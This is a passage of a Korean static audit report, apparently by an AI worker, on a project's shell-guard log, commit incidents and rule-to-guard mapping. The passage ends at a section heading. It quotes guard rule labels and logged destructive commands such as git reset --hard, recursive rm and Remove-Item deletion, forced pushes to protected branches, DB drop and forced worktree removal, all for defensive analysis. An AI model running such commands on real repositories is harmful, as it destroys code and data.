  - 다만 마커 자체(세션 인계 프롬프트 첫 줄의 `**A~**D`)는 실사용 증거가 있어 통째 DELETE 보다는 **COMPRESS**(플랜+원장 프로토콜 산문 설명은 줄이되, 세션 인계 첫 줄 마커 관례 자체는 유지) 쪽이 근거에 더 맞는다. 완주율 미달의 원인은 마커 자체가 아니라 **ledger 상태 갱신 규율**(BLOCKED 13건·PENDING 15건이 방치)에 있어 보인다 — 이건 이 워커의 판정 범위를 넘는 별도 관측으로 보고서에 인계.
- `docs/guides/LONG_TASK_PROMPTS.md`(135줄, 명령: `wc -l docs/guides/LONG_TASK_PROMPTS.md` → 135)·`_EASY.md`(168줄, 명령: `wc -l docs/guides/LONG_TASK_PROMPTS_EASY.md` → 168)는 **자동 로드 아님, 비용 없음** — 어떤 훅·CLAUDE.md 도 이 파일들을 세션 시작 시 읽지 않는다(명령: `grep -rln "LONG_TASK_PROMPTS" .claude/ CLAUDE.md AGENTS.md` → `CLAUDE.md` 1건만, 그것도 포인터 문구지 로드 지시가 아님). 판정 대상에서 비용 항목은 제외, 항목화만.

---

## 요약 (이 워커 범위)

- A: 표본 30개 중 DELETE 21(70.0%) · KEEP-FACT 6(20.0%) · KEEP-PREF 3(10.0%, feedback type). 외삽 시 153개 중 잔존(KEEP) 약 46개, MEMORY.md 상한 제안 60줄.
- B: ledger 58개 완주율 30/58=51.7%(<70%) → L4 COMPRESS/DELETE 후보. 등급 마커는 원시 grep 71개 파일(53줄 in-scope)이지만 실사용은 9줄뿐(세션 인계 프롬프트 파일군 한정) — 오탐 44줄 제외 필수.


# 조각 5 — ledger-part-5-recurrence.md

# 원장 조각 5 — 재발 기록 대조 (규칙 매핑)

담당: 정적 감사 워커 5 (§8 항목 5). 기준: 지시서 `docs/plans/2026-09-09-harness-ablation-v2-meta-prompt.md` §1 · §2.3 · §3(H2·R2) · §4.2 · §5 항목 4 · §6 항목 3.
저장소 HEAD(조사 시점): `fe21a5cc3` — 명령 `git log --oneline -1`. 사실 카드 기준 `46bdac44d` 와 다르므로 아래 수치는 전부 재측정값이다.
읽기 전용으로 수행했다. 저장소 파일은 하나도 바꾸지 않았다.

---

## 0. 조사 전에 확정된 두 가지 정정 (아래 모든 판정의 전제)

### 0.1 정정 1 — 가드 로그의 관측 창은 5주가 아니라 사흘이다

`docs/harness/logs/SHELL_GUARD_LOG.md` 는 **300행 롤링 캡**이다.

- 코드 근거: `.claude/hooks/guard_shell.py:39` `_LOG_CAP = 300`, `:77-78` `if len(data_rows) > _LOG_CAP: data_rows = data_rows[-_LOG_CAP:]`.
- 실제 날짜 분포: 2026-09-07 91행 · 2026-09-08 62행 · 2026-09-09 147행. **2026-09-07 이전 행은 한 줄도 없다.**
  - 명령: `awk -F'|' 'NR>6{print $2}' docs/harness/logs/SHELL_GUARD_LOG.md | sed 's/^ *//' | cut -c1-10 | sort | uniq -c`
- 복구 불가: 파일이 git 추적 대상이 아니다(`.gitignore:125`). 명령 `git ls-files docs/harness/logs/SHELL_GUARD_LOG.md` → 0행.

따라서 지시서 §2.3 의 "2026-08-03 이후 300행" 은 성립하지 않는다. 정확히는 **2026-09-07 11:19 ~ 2026-09-09 20:38, 약 57시간**의 기록이다. §3 H2 의 근거 후보(ask 16/9/20건)는 5주치가 아니라 사흘치다.

### 0.2 정정 2 — production 푸시 ask 16건은 전부 가드 테스트가 만든 행이다

두 시각에 82행씩, 총 164행이 한꺼번에 들어왔다(§2.3 은 44행씩으로 적었으나 재측정은 82행씩이다).

- 명령: `cut -c1-16 <파싱본> | uniq -c` → `82  2026-09-07 12:02`, `82  2026-09-09 16:50`.
- 발생원: `tests/harness/test_guard_policy.py` 의 `CASES` 표(`:28-70`)가 `.claude/hooks/guard_shell.py` 와 `.cursor/hooks/guard_shell.py` 를 서브프로세스로 부르는데, 훅이 실 로그 경로(`harness_log_path("SHELL_GUARD_LOG.md")`)에 그대로 쓴다. 로그 격리가 없다.
- **산술 일치(우연 아님 증명)**:

| 라벨 | CASES 표 케이스 수 | 곱 (케이스 x 훅 2종 x 실행 2회) | 로그 관측 | 일치 |
|---|---|---|---|---|
| `production 푸시` | 4 (`git push origin production` / `... HEAD:production` / `... deploy:production` / 개행 우회형) | 4 x 2 x 2 = 16 | 16 | 일치 |
| `Remove-Item 재귀 강제 삭제` | 5 (`test_guard_policy.py:45-49`) | 5 x 2 x 2 = 20 | 20 | 일치 |
| `pip install` | 9 (`:51-59`) | 9 x 2 x 2 = 36 | 36 | 일치 |
| `reset --hard`(ask) | 1 (`:44`) | 1 x 2 x 2 = 4 | 오염 4 + 실제 5 = 9 | 일치 |

세 라벨은 실 발화가 **0건**이다. §5 항목 4 의 "16회 중 몇 건이 사용자 명시 승격인가" 라는 질문은, 답이 "16건 모두 사용자 행위가 아니다" 로 바뀐다.

### 0.3 실제 발화만 남긴 분포 (오염 164행 제외 = 136행)

명령: 파싱본에서 `2026-09-07 12:02` · `2026-09-09 16:50` 접두 행을 제외한 뒤 `(판정, 라벨)` 집계.

| 판정 | 라벨 | 실제 | 오염 |
|---|---|---|---|
| ask | `deploy 푸시 타 세션 커밋 포함` | 95 | 0 |
| ask | `checkout --` | 29 | 0 |
| ask | `reset --hard` | 5 | 4 |
| ask | `deploy 푸시 레저 없음` | 2 | 0 |
| ask | `pip install` | 0 | 36 |
| ask | `Remove-Item 재귀 강제 삭제` | 0 | 20 |
| ask | `production 푸시` | 0 | 16 |
| deny | `reset --hard origin` | 2 | 4 |
| deny | `rm 재귀 삭제(루트/상위 경로)` | 2 | 4 |
| deny | `git clean 강제 삭제` | 1 | 6 |
| deny | `보호 브랜치 강제 푸시` | 0 | 70 |
| deny | `DB 파괴 명령(drop)` | 0 | 4 |
| **합계** | | **136** | **164** |

---

## 1. 재발·사고 목록 (낱말 전수 검색)

### 1.1 낱말별 히트 수

원천 A = `git log --since=2026-08-03 --format="%h %ad %s" --date=short` (1,480행). 원천 B = `docs/AI_CHANGELOG.md` (파일이 최근 20행만 보존하므로 실제 범위는 2026-08-30 ~ 2026-09-09 다. 명령: `awk -F'|' 'NR>6 {print $2}' docs/AI_CHANGELOG.md`).

명령(A): `for w in 잘못 재발 ... ; do grep -c -- "$w" log_subjects.txt; done`
명령(B): 같은 반복문에 `docs/AI_CHANGELOG.md` 를 넣는다.

| 낱말 | A(커밋 제목) | B(CHANGELOG) | 비고 |
|---|---|---|---|
| 잘못 | 1 | 0 | |
| 재발 | 3 | 0 | 2건은 재발 "방지" 기록 |
| 혼입 | 3 | 0 | 전부 제품 로직(파일 혼입) |
| 한자 | 0 | 0 | 낱말로는 0. 실제 한자 문자는 절 4 에서 별도 검출 |
| 오염 | 1 | 1 | |
| 사고 | 11 | 2 | |
| 유실 | 6 | 1 | |
| 증발 | 5 | 2 | |
| 임의 | 0 | 0 | |
| 우회 | 2 | 0 | 전부 기능 이름(우회율 지표 등) |
| 타 세션 | 4 | 0 | **전부 프로세스 실패** |
| 미검증 | 2 | 2 | 전부 리뷰 판정 용어, 실패 아님 |
| production | 36 | 9 | 34건이 정상 승격 기록 |
| 강제 | 8 | 1 | 7건이 제품 기능 "단계 강제 변경" |
| 되돌 | 10 | 3 | 9건이 제품 기능 "되돌리기" |
| 복구 | 32 | 2 | 18건이 AI_STATUS 예산 복구 |
| 무시 | 0 | 1 | |
| **총 히트** | **114** | **24** | 중복 커밋 포함 |

### 1.2 전수 목록 (제품 버그 포함, 원인 부류 표기)

집계 규칙: `production` 34건과 `복구` 중 AI_STATUS 예산 18건은 같은 성격이 반복되므로 묶음 행으로 적고 SHA 를 나열한다. 나머지는 개별 행이다.

| 날짜 | SHA / CHANGELOG 행 | 한 줄 요약 | 원인 부류 |
|---|---|---|---|
| 2026-08-06 | `1225113c4` | PG 레인 감사 DSN 비밀번호 마스킹 유실로 CI 인증 실패 | 하네스 결함 |
| 2026-08-07 | `c7c11b111` | 같은 파일을 동시 편집하던 타 세션의 미완 테스트가 경로 지정 커밋에 함께 실려 CI red | 프로세스 실패 |
| 2026-08-07 | `385865995` | 위 사건 후속 — 구현이 deploy 에 도착해 짝이 맞자 가드 복구 | 프로세스 실패 |
| 2026-08-07 | `740466264` | Sentry 환경 태그가 스테이징을 production 으로 오분류 | 제품 버그 |
| 2026-08-07 | `22e3898f8` | 선택자 정본화가 남긴 완료 전이 구멍 | 제품 버그 |
| 2026-08-08 | `3c5f54ddc` | 파일 열람 화면에 구 형식 행 혼입·PII 노출 | 제품 버그 |
| 2026-08-13 | `fc5814b60` | 타 세션의 선형 재연결이 정본이라 no-op merge 리비전 철회(마이그레이션 체인 경합) | 프로세스 실패 |
| 2026-08-13 | `87766984d`,`ee47792c6` | 채널톡 AS PUSH 옛 파일 혼입·최신 파일 탈락 | 제품 버그 |
| 2026-08-14 | `b7c85bb8b` | 일괄 완료처리가 AS 주문을 삼킴 | 데이터 사고 |
| 2026-08-14 | `3fedff203` | 배송메모가 통째로 유실되던 매핑 오류 | 제품 버그 |
| 2026-08-14 | `fb02cb2da` | `asfresh_00` 을 production head 위로 재배치 | 프로세스 실패 |
| 2026-08-15 | `fbeb07b87` | 데이터 사고 복구 도구(data doctor) 신설 — 위 사고 대응 | 데이터 사고(대응) |
| 2026-08-16 | `70adf68f6` | AS 증발 사고·복구 도구 기록 | 데이터 사고 |
| 2026-08-19 | `0738e3351` | 새 감사 행위 3종이 한글 라벨 없이 나가 CI red (pre_push_smoke 서브셋에 게이트 없음) | 하네스 결함 |
| 2026-08-19 | `0f84dac63` | 오프사이트 백업 전면 실패 | 데이터 사고 |
| 2026-08-20 | `9a932aa86` | 네이버 연락처 유실·복구 | 데이터 사고 |
| 2026-08-20 | `8d06f50b6` | 복원 GUI 저장 유실 | 제품 버그 |
| 2026-08-21 | `08b9c32b6`,`b50af7825` | 멀티에이전트 리뷰 결과 확정 3건 + 미검증 8건 판정 | 실패 아님(리뷰 용어) |
| 2026-08-25 | `6d212ecb9` | 단계 강제 변경이 400 으로 막힘 | 제품 버그 |
| 2026-08-27 | `f2e15b2c2`,`28219edb3` | 채널톡 401 — 토큰 수명 오판 + 재발급 누락 | 제품 버그 |
| 2026-08-27 | `156608706` | 워크벤치 자산 핀을 한 칸 더 올림 — 타 세션과 같은 값에 다른 JS | 프로세스 실패 |
| 2026-08-27 | `3e7a5099c` | 커밋 메시지 본문 12행에 한자 2문자 유출(`덧붙임` 뜻의 한자어, 원문 인용 생략) | 프로세스 실패 |
| 2026-08-28 | `cef5acbb3` | 예약금 최초 입력값 증발(출고가 0 일 때 clamp) | 제품 버그 |
| 2026-08-28 | `a5e18a72f` | iOS 이탈 시 초안 유실 | 제품 버그 |
| 2026-08-29 | `022c6c492` | 예약금 증발 핫픽스 4건 기록 | 제품 버그 |
| 2026-08-30 | `827c44dbf` | CI docs 전용 스텝 줄바꿈 깨짐 — 백슬래시 뒤 CR 유실 | 하네스 결함 |
| 2026-08-30 | CHANGELOG 25행 | `tests/visual` 이 본 스위트에서 `--ignore` 라 4개만 돌던 CI 사각 | 하네스 결함 |
| 2026-08-31 | `3cb6e428a`,`8504f18b0` | 지도 주소 수정 403 — standalone 문서 CSRF 배선 누락 | 제품 버그 |
| 2026-09-01 | `7357924c0` | 타 세션 승격이 이 세션 파일까지 함께 올림 | 프로세스 실패 |
| 2026-09-01 | `a47b67d4f` | 트리아지 자동 매칭이 같은 고객을 못 찾던 축 2개 | 제품 버그 |
| 2026-09-02 | `1da2c03b3` | 네이버 수집 누락 + 취소 확정 집을 살아 있는 주문에 붙이라 권함 | 데이터 사고 |
| 2026-09-02 | `555cfe8d7`,`78e212c45` | 추가구성상품 집의 클레임 호출 순서 — 본품 미환불 | 데이터 사고 |
| 2026-09-02 | `585c225a9`,`f7884b514` | 지오코딩 사고 최초 트리거 — `SIDEFX` 서비스에만 `KAKAO_REST_API_KEY` 가 없었다 | 프로세스 실패(배포 구성) |
| 2026-09-02 | `eea20aef9` | 네이버 트리아지 자동 매칭 사고 등재 | 데이터 사고 |
| 2026-09-02 | `8ef68fce2` | 네이버 클레임 승인 운영 ON — 자산 핀 사고 | 프로세스 실패 |
| 2026-09-03 | `fe112d765` | 열린 AS 건 status 를 물류 축 자동 승격이 덮음 — 지방 AS 섹션 증발 | 제품 버그 |
| 2026-09-04 | `308366961` | AS 가 ERP stage 를 오염시키던 구멍 2곳 (레거시 오염 477건 잔존) | 데이터 사고 |
| 2026-09-04 | CHANGELOG 8행 | 코드만 승격해 온 탓에 문서가 deploy 보다 157커밋 뒤처져 매 승격마다 충돌 | 프로세스 실패(규칙 부작용) |
| 2026-09-04 | CHANGELOG 8행 | `Remove-Item` 재귀 가드 완화가 백업 가지에만 남아 있어 회수 | 하네스 결함 |
| 2026-09-06 | `42898cdce` | `afb0b4396` 이 gitignore 된 테스트 산출물 31개를 강제 추가 | 프로세스 실패 |
| 2026-09-07 | `fa05437f0` | 단계 강제 변경이 폼 저장 한 번에 취소됨 | 제품 버그 |
| 2026-09-08 | `18e6f4276` | 워커 자멸 사고 기록 + AI_STATUS 상단 예산 초과(4,424자) 복구 | 하네스 결함 |
| 2026-08-03 ~ 09-08 | 18커밋 묶음 | AI_STATUS 상단 40줄 4,000자 예산 초과 → 복구 (`3ceee228e` `0077e7458` `136036987` `937ee7fb6` `b80186ee5` `1c59ce094` `70adf68f6` `d25971f1e` `942067434` `222222a81` `9fed3aa13` `21694273f` `1d423f0e4` `833aaf401` `5d2bfb95a` `e850e38d5` `7d29a7182` `18e6f4276`) | 프로세스 실패(반복) |
| 2026-08-03 ~ 09-09 | 41커밋 묶음 | 인벤토리 재생성·줄밀림·줄번호 동기화 (명령: `git log --since=2026-08-03 --format="%h %ad %s" --date=short \| grep -ciE "인벤토리.*(재생성\|동기화\|정합)\|줄밀림\|줄번호"` = 41) | 하네스 결함(유지비) |
| 2026-08-01 ~ 09-04 | 34커밋 묶음 | 정상 운영 승격 기록(`production <SHA>` / `PR #n`) — `2509a0984` 외 33건 | 실패 아님 |
| 2026-08-14 | `a60e88f98` | production 병합 후 감사 인벤토리 줄번호 동기화 | 하네스 결함(유지비) |
| 2026-08-11 ~ 09-03 | 8커밋 묶음 | 제품 기능 "되돌리기" 신설·수정 (`3d3c2f618` `492304c69` `48b8db094` `5d8db32ba` `1b46dbf3e` `945a54cee` `2a520110a` `b708d4d87`) | 실패 아님(기능) |
| 2026-08-14 | `53b593797` `e7a9ff717` `c502332a5` `99f9be2b0` `b01753502` `64f6c7166` | 제품 기능 "단계 강제 변경" 계열 | 실패 아님(기능) |

**다음 단계로 보내는 건**: 프로세스 실패 12(묶음 포함) · 하네스 결함 8 · 데이터 사고 8 = **28건**. 제품 버그 20건과 "실패 아님" 묶음은 제외한다.

---

## 2. 규칙 매핑표

열 뜻: (a) 규칙 경로:행 = 이것을 막으려던 텍스트 · (b) 로드 여부 = 2026-08-03 이후 상시 로드 상태였는가 · (c) 코드 가드 = 훅/permissions.deny/테스트 존재 여부 · (d) 결과.

| 건 | 규칙 경로:행 | 로드 | 코드 가드 | 결과 (d) | 함의 |
|---|---|---|---|---|---|
| `c7c11b111` 타 세션 미완 테스트가 경로 지정 커밋에 실려 CI red (2026-08-07) | `CLAUDE.md:90` deploy push 세션 격리 · `AGENTS.md:82` · `AGENTS.md:83` 세션 worktree | 예 | 있음 — `guard_policy.py` `deploy 푸시 타 세션 커밋 포함` ask. 단 판정 단위가 **커밋**이라 같은 파일 안에 섞인 타 세션 편집은 보지 못한다 | **규칙 있어도 발생** | MOVE-TO-CODE — 가드에 파일 내용 단위(`git diff --stat` 대비 세션 레저) 검사 추가 |
| `fc5814b60` 타 세션 마이그레이션 체인 경합 (2026-08-13) | `CLAUDE.md:91` 동시 2+창 워크트리 · `AGENTS.md:83` | 예 | 없음 (alembic 리비전 경합 전용 가드 부재) | **아무것도 없어 발생** | MOVE-TO-CODE — alembic head 단일성 pre_push 검사 |
| `156608706` 타 세션과 같은 값에 다른 JS(자산 핀 경합) (2026-08-27) | `CLAUDE.md:91` 핫파일은 공유 트리 유지 · `AGENTS.md:83` | 예 | 없음 | **규칙 있어도 발생** | MOVE-TO-CODE — 자산 핀 값 충돌 계약 테스트 |
| `7357924c0` 타 세션 승격이 이 세션 파일까지 함께 올림 (2026-09-01) | `CLAUDE.md:89` 승격=자기 커밋 cherry-pick · `AGENTS.md:79-80` | 예 | 부분 — `permissions.deny` 는 `git push origin production*` 만 막는다. 실제 승격은 `promote/own-*` 브랜치 push + PR 이라 가드 밖이다 | **규칙 있어도 발생** | MOVE-TO-CODE — `promote_own_to_production.py` 산출 PR 의 커밋 범위를 세션 레저와 대조하는 검사 |
| CHANGELOG 8행(2026-09-04) 문서가 deploy 보다 157커밋 뒤처짐 | `CLAUDE.md:89` / `AGENTS.md:79` cherry-pick 전용 승격 | 예 | 있음(같은 규칙이 코드로도 강제됨) | **규칙이 만든 비용** | 규칙 유지하되 문서 계보 정합 자동화가 필요. 판정은 KEEP-CODE + 부작용 등재 |
| `42898cdce` gitignore 된 산출물 31개가 강제 추가됨 (원인 커밋 `afb0b4396`, 2026-09-04) | 해당 규칙 없음 (`tests/visual/artifacts/.gitignore` 문구뿐, 상시 로드 아님) | 아니오 | 없음 — `guard_policy.py` 에 `git add -f` 패턴 없다. 명령 `grep -n "add -f\|add --force" tools/harness/guard_policy.py` → 0행 | **아무것도 없어 발생** | MOVE-TO-CODE — `git add -f` / 무시 경로 추가를 ask 로 |
| AI_STATUS 상단 40줄 예산 초과 18건 (2026-08-03~09-08) | `CLAUDE.md:23` 새 세션 시작 프로토콜 1 | 예 | 있음 — `tests/harness/test_hook_log_hygiene.py:26` `AI_STATUS_HEAD_MAX_CHARS = 4000`, `:184` `test_ai_status_head_budget()`. 도입 커밋 `9c43aa77b`(2026-07-28, 창 시작 전) | **코드가 막음** (18회 전부 red 로 잡혀 복구 커밋이 뒤따랐다. `18e6f4276` 본문: "4,424자로 예산(4,000)을 넘어 hygiene 계약이 red 였다") | **KEEP-CODE**. 텍스트 규칙 `CLAUDE.md:23` 은 예산 숫자를 적지도 않으므로 산문 쪽은 압축 대상 |
| `0738e3351` 새 감사 행위 3종 라벨 미등재 CI red (2026-08-19) | 프로젝트 `CLAUDE.md` 에 없음. 메모리 카드 `project_new_audit_action_needs_label.md` 만 있음 | 부분(메모리 색인만) | 있음 — `test_admin_audit_screen_readability_3`. 단 커밋 본문이 "pre_push_smoke 서브셋에는 이 게이트가 없다" 고 적었다 | **코드가 막음**(CI 단계에서) | KEEP-CODE + 게이트를 pre_push_smoke 서브셋으로 앞당김 |
| `827c44dbf` CI docs 스텝 CR 유실 (2026-08-30) | 없음 | 아니오 | 없음 | **아무것도 없어 발생** | 하네스 결함 등재. 규칙 판정 대상 아님 |
| `1225113c4` PG 레인 DSN 마스킹 유실 (2026-08-06) | 없음 | 아니오 | 없음 | **아무것도 없어 발생** | 하네스 결함 등재 |
| CHANGELOG 8행 `Remove-Item` 가드 완화가 백업 가지에만 남음 (2026-09-04) | `CLAUDE.md:92` 위험 명령은 `guard_policy.py` 가 코드로 차단 | 예 | 있음(가드 자체) — 그러나 가드 소스의 변경분이 승격 경로에서 누락됐다 | **규칙 있어도 발생**(가드 코드 자체의 승격 누락) | 하네스 파일도 승격 완전성 검사(`promote_completeness.py`) 대상에 넣어야 한다 |
| 인벤토리 churn 41커밋 (2026-08-03~09-09) | `CLAUDE.md` 에 직접 규칙 없음(하네스 자동 배선 절, `:35-40`) | 예 | 있음(인벤토리 계약 테스트) | **코드가 막음**(막았으나 비용이 크다) — 날짜 분포상 08-03~08-14 에 31건이 몰리고 이후 10건으로 줄었으나 2026-09-09 에도 1건 있다. 명령: 위 grep 결과를 `awk '{print $2}' \| sort \| uniq -c` | DOWNGRADE 후보 — §5 항목 8 의 "lineno-무관 게이트 이후 churn 0" 은 **성립하지 않는다**(0 이 아니다) |
| `3e7a5099c` 커밋 메시지 한자 1개 (2026-08-27) | `CLAUDE.md:6` 한자 금지 | 예 | 없음 | **규칙 있어도 발생** (1,480커밋 중 1건) | MOVE-TO-CODE(경량) 또는 KEEP-PREF 유지 — 위반률 0.07% 라 코드화 이득이 작다 |
| 인라인 스타일 신규 76행 (절 4 항목 2) | `CLAUDE.md:70` 인라인 스타일 금지 · `CLAUDE.md:45` 재진술 | 예 | 없음 | **규칙 있어도 발생** (반복·다수) | **MOVE-TO-CODE** — 텍스트 규칙이 5주간 76행을 못 막았다. 산문 2벌(`:45`,`:70`)은 RESOLVE 대상이기도 하다 |
| `b7c85bb8b`/`70adf68f6` 일괄 완료처리 AS 증발 (2026-08-14~16) | `AGENTS.md:34` 문제 수정 정책(사후 규칙) | 예 | 사건 당시 없음 → 사후에 "상태 이전값 감사" 추가 | **아무것도 없어 발생** | MOVE-TO-CODE(이미 이행됨) — KEEP-CODE 근거로 인용 가능 |
| `585c225a9` 지오코딩 — `SIDEFX` 서비스에만 카카오 키 없음 (2026-09-02) | 없음. `CLAUDE.md:9` 는 Railway 를 적지만 서비스가 4종인 사실은 없다 | 아니오 | 없음 | **아무것도 없어 발생** | **KEEP-FACT 신설** — "Railway 서비스는 web·WORKER·FOMS-cron·SIDEFX 4종이고 환경변수가 서비스마다 다르다" 를 L2 사실로 1줄 등재 |
| `1da2c03b3`/`eea20aef9` 네이버 수집 누락·오매칭 (2026-09-01~02) | 없음(제품 정책) | - | 사건 후 계약 테스트 추가 | 아무것도 없어 발생 | 제품 축. 하네스 판정 대상 아님 |
| `555cfe8d7` 본품 미환불 (2026-09-02) | 없음 | - | 사건 후 순서 계약 테스트 | 아무것도 없어 발생 | 제품 축 |
| `0f84dac63` 오프사이트 백업 전면 실패 (2026-08-19) | 없음 | 아니오 | 없음(당시) | **아무것도 없어 발생** | 운영 축. 감시 필요 |
| `18e6f4276` 워커 자멸 사고 (2026-09-08) | 없음. 메모리 카드 `project_workflow_interrupt_kills_workers_resume.md` 만 있음 | 부분 | 없음(당시) → 사후 정지 감지 16분으로 단축(`0f6483290`) | **아무것도 없어 발생** | 제품/운영 축 |
| production 직접 push 실 시도 0건 (2026-09-07~09-09) | `CLAUDE.md:88` · `AGENTS.md:78` · `permissions.deny` | 예 | 있음(deny 3줄 + ask) | **규칙이 막음 — 추정** | 트랜스크립트 없이는 증명 불가. 다만 실제 승격 동선이 `promote/own-*` + PR 이라 직접 push 명령 자체가 생기지 않는 구조라는 대안 설명이 더 강하다. §3 H2 의 근거로 쓸 수 없다 |
| `reset --hard` 실제 5건 (2026-09-08~09-09) | `CLAUDE.md:92` 위험 명령 | 예 | 있음(ask) | **코드가 막음 — 그러나 전부 일상 작업** (절 3.2) | DOWNGRADE 후보 |
| `checkout --` 실제 29건 | 규칙 텍스트 없음 | - | 있음(ask) | **코드가 막음 — 전부 일상 작업, 라벨 오탐 12건** (절 3.3) | DOWNGRADE 후보 |

### 2.1 결과 (d) 집계

| 결과 | 건수 |
|---|---|
| 규칙 있어도 발생 (MOVE-TO-CODE 후보) | **6** |
| 아무것도 없어 발생 | 8 |
| 코드가 막음 (KEEP-CODE 근거) | 5 |
| 코드가 막음 — 그러나 오탐/일상 (DOWNGRADE 후보) | 2 |
| 규칙이 막음 (추정, 증명 불가) | 1 |
| 규칙이 만든 비용 | 1 |

**"규칙 있어도 발생" 6건**: ① `c7c11b111` 타 세션 편집 혼입 ② `156608706` 자산 핀 경합 ③ `7357924c0` 타 세션 승격 동반 ④ `Remove-Item` 가드 완화 승격 누락 ⑤ 인라인 스타일 76행 ⑥ 커밋 메시지 한자 1건.

---

## 3. 가드 ask/deny 분류표

### 3.1 `production 푸시` ask 16건 — 전수

`docs/harness/logs/SHELL_GUARD_LOG.md` 의 16행 전부. 대조 명령: `git log origin/production --since="<t-2h>" --until="<t+2h>" --format="%h %ad %s" --date=iso`.

| # | 시각 | 명령 | ±2시간 안 production 머지 | 지시서 분류 | 실제 판정 |
|---|---|---|---|---|---|
| 1 | 2026-09-07 12:02:07 | `git push origin production` | 있음 (`673de11a1` 11:35 PR #306, `90e82cf7b` 13:37 PR #307) | 사용자 명시 승격 중 | **테스트 오염** |
| 2 | 2026-09-07 12:02:07 | `git push origin HEAD:production` | 있음 | 사용자 명시 승격 중 | **테스트 오염** |
| 3 | 2026-09-07 12:02:07 | `git push origin deploy:production` | 있음 | 사용자 명시 승격 중 | **테스트 오염** |
| 4 | 2026-09-07 12:02:10 | `git status` + 개행 + `git push origin production` | 있음 | 사용자 명시 승격 중 | **테스트 오염** |
| 5 | 2026-09-07 12:02:25 | `git push origin production` | 있음 | 사용자 명시 승격 중 | **테스트 오염** |
| 6 | 2026-09-07 12:02:25 | `git push origin HEAD:production` | 있음 | 사용자 명시 승격 중 | **테스트 오염** |
| 7 | 2026-09-07 12:02:25 | `git push origin deploy:production` | 있음 | 사용자 명시 승격 중 | **테스트 오염** |
| 8 | 2026-09-07 12:02:27 | `git status` + 개행 + `git push origin production` | 있음 | 사용자 명시 승격 중 | **테스트 오염** |
| 9 | 2026-09-09 16:50:46 | `git push origin production` | 있음 (`93a2addf7` 16:23 PR #332, `1bdcdc79f` 15:40 PR #336) | 사용자 명시 승격 중 | **테스트 오염** |
| 10 | 2026-09-09 16:50:46 | `git push origin HEAD:production` | 있음 | 사용자 명시 승격 중 | **테스트 오염** |
| 11 | 2026-09-09 16:50:46 | `git push origin deploy:production` | 있음 | 사용자 명시 승격 중 | **테스트 오염** |
| 12 | 2026-09-09 16:50:47 | `git status` + 개행 + `git push origin production` | 있음 | 사용자 명시 승격 중 | **테스트 오염** |
| 13 | 2026-09-09 16:50:50 | `git push origin production` | 있음 | 사용자 명시 승격 중 | **테스트 오염** |
| 14 | 2026-09-09 16:50:51 | `git push origin HEAD:production` | 있음 | 사용자 명시 승격 중 | **테스트 오염** |
| 15 | 2026-09-09 16:50:51 | `git push origin deploy:production` | 있음 | 사용자 명시 승격 중 | **테스트 오염** |
| 16 | 2026-09-09 16:50:52 | `git status` + 개행 + `git push origin production` | 있음 | 사용자 명시 승격 중 | **테스트 오염** |

**합계: 사용자 명시 승격 중 0 · 명시 근거 없음 0 · 테스트 오염 16.**
±2시간 휴리스틱만 쓰면 16건 모두 "사용자 명시 승격 중" 으로 분류되지만, 그것은 우연이다(두 버스트가 마침 활발한 승격 날에 걸렸다). 절 0.2 의 산술 일치가 정본이다. **"명시 요청 없이 시도" 는 0건이고, 동시에 "사용자 실제 시도" 도 0건이다** — 이 로그로는 §5 항목 4 의 KEEP-CODE 근거를 세울 수 없다.

### 3.2 `reset --hard` 9건 — 전수

| # | 시각 | 판정 | 명령(요약) | 분류 |
|---|---|---|---|---|
| 1 | 2026-09-08 19:00:32 | ask | `git reset --hard >/dev/null; cd C:/DEV/FOMS && git worktree remove --force /c/tmp/prodpick` | 일상 작업(워크트리 정리) |
| 2 | 2026-09-09 08:27:28 | ask | `git reset --hard >/dev/null; ... git worktree remove --force /c/tmp/prodpick2` | 일상 작업 |
| 3 | 2026-09-09 11:44:52 | ask | `cd C:/tmp/prodpick3 && git cherry-pick --abort; git reset --hard; ... worktree remove` | 일상 작업 |
| 4 | 2026-09-09 14:55:06 | ask | `cd C:/tmp/foms-s-settle-prog && git reset -q --hard HEAD~1 && git rebase origin/deploy` | 일상 작업(세션 워크트리 rebase) |
| 5 | 2026-09-09 15:14:55 | ask | `cd C:/tmp/foms-s-settle-prog && git fetch -q origin deploy && git reset -q --hard HEAD~1 && git rebase -q origin/deploy` | 일상 작업 |
| 6~9 | 2026-09-07 12:02 / 2026-09-09 16:50 | ask | `git reset --hard` (CASES 표) | **테스트 오염 4건** |

**정탐(위험 시도) 0 · 일상 작업 5 · 테스트 오염 4.** 5건 모두 `c:/tmp` 워크트리 안에서의 정리·rebase 이며 `C:/DEV/FOMS` 본 트리 대상은 없다.

### 3.3 `checkout --` 29건 (사실 카드 28건 대비 +1) — 전수 시각 + 표본

전수 시각: `2026-09-07 12:09:04, 15:26:21, 17:04:02, 21:52:19, 22:33:51 / 2026-09-08 09:10:04, 09:18:52, 14:50:42, 15:35:45, 15:40:51, 15:47:23 / 2026-09-09 07:52:19, 08:40:25, 08:52:48, 09:44:59, 10:55:06, 11:09:38, 11:37:31, 11:39:23, 12:01:25, 13:05:04, 13:13:46, 13:43:39, 14:38:49, 14:42:01, 14:48:06, 15:24:11, 15:42:32, 16:59:47`.

명령에 실제 `git checkout --` 이 있는 행 **17건**, 라벨만 붙고 명령에는 없는 **오탐 12건**. 명령: 파싱본에 `re.search(r'git\s+(-c\s+\S+\s+)?checkout\s+(--|--ours|--theirs)', cmd)`.

| 표본 | 시각 | 명령(요약) | 분류 |
|---|---|---|---|
| 1 | 2026-09-08 14:50:42 | `git checkout -- docs/harness/foms_failopen_inventory.json docs/harness/foms_order_mutation...` | 일상 작업 — 인벤토리 churn 되돌리기 |
| 2 | 2026-09-09 13:05:04 | `git checkout -- docs/harness/ 2>/dev/null; python - <<'PY' ...` | 일상 작업 — 같은 churn |
| 3 | 2026-09-07 17:04:02 | `cd /c/tmp/foms-prod-own-... && git checkout --ours -- docs/AI_STATUS.md` | 일상 작업 — 승격 워크트리 충돌 해소 |
| 4 | 2026-09-09 10:55:06 | `python -m pytest tests/harness/test_hook_log_hygiene.py -q` | **오탐** — 명령에 checkout 없음 |
| 5 | 2026-09-09 16:59:47 | `{ echo "== pytest integrations+harness"; python -m pytest ...` | **오탐** |

**정탐(위험 시도) 0 · 일상 작업 17 · 라벨 오탐 12.** 17건 중 13건이 `docs/harness/` 인벤토리 되돌리기로, 절 1 의 churn 41커밋과 같은 뿌리다.

### 3.4 `Remove-Item 재귀 강제 삭제` 20건 — 전수

